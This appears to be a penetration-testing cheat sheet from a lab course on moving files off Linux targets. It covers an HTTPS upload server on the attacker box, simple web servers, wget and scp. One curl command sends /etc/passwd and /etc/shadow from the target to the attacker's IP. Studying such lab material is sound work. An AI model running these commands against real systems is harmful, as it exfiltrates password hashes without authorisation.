# Linux Upload Operations

## Web Upload

1. Pwnbox - Start Web Server
sudo python3 -m pip install --user uploadserver

2. Pwnbox - Create a Self-Signed Certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

3. Pwnbox - Start Web Server
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem

4. Target - Upload Multiple Files
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

upload_nix.zip

## Alternative Web File Transfer Method

1. Target - Creating a Web Server with Python3 Python2.7 PHP Ruby
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

2. Download the File from the Target Machine onto the Pwnbox
wget $TARGET:8000/filetotransfer.txt

wget $TARGET:8000/upload_nix.zip

## SCP Upload
scp /etc/passwd plaintext@$TARGET:/home/plaintext/
scp upload_nix.zip plaintext@10.10.15.65:/home/

scp upload_nix.zip htb-student@10.129.21.249:/home/


find .-name upload_nix 2> /dev/null

gunzip -S .zip upload_nix.zip

